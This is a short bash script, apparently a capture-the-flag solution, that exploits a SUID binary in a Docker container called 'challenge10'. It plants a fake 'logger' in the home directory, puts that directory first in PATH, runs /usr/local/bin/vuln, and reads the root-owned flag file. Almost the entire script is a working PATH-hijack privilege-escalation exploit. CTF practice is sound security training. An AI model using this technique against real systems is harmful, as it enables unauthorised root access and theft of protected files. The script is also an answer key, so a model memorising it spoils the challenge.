#!/usr/bin/env bash
set -euo pipefail

CONTAINER="challenge10"

# Create a malicious logger that exfiltrates the flag
docker exec -u ctfuser "$CONTAINER" bash -lc '
cat > ~/logger << "SH"
#!/usr/bin/env bash
# Run with the SUID binary's effective UID (root).
cat /root/flag.txt > /tmp/flag.out
SH
chmod +x ~/logger
'

# Prepend current directory to PATH and trigger the SUID binary
docker exec -u ctfuser "$CONTAINER" bash -lc '
export PATH="$HOME:$PATH"
# Show which logger will be used (should point to ~/logger)
command -v logger
/usr/local/bin/vuln
cat /tmp/flag.out
'
